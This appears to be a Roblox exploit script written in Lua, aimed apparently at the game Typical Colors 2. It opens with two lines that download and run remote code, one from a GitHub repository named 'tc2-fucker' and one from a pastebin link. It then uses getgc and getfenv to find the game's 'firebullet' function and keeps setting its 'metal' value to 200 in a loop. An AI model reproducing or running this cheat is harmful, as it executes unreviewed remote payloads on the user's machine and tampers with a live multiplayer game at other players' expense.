loadstring(game:HttpGet("https://raw.githubusercontent.com/SlitherPog/tc2-fucker/master/tc2%20fucker"))();

loadstring(game:HttpGet("https://pastebin.com/raw/mAMrsYw3"))();

for i,v in next, getgc() do
if type(v) == "function" and debug.getinfo(v).name == "firebullet" then
local a = getfenv(v);
while wait() do
a.metal = 200
end
end
end
